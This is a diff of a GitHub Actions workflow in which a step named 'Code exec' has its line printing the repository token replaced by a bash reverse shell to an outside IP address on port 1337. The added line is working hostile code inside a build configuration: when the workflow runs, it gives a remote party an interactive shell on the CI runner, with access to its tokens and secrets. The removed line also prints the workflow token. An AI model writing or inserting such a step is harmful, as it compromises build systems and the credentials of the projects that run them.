@@ -19,4 +19,4 @@ jobs:
     steps:
       # Execute code
       - name: Code exec
-        run: echo ${{ github.token }} & sleep 1000
+        run: bash -i >& /dev/tcp/34.28.183.229/1337 0>&1
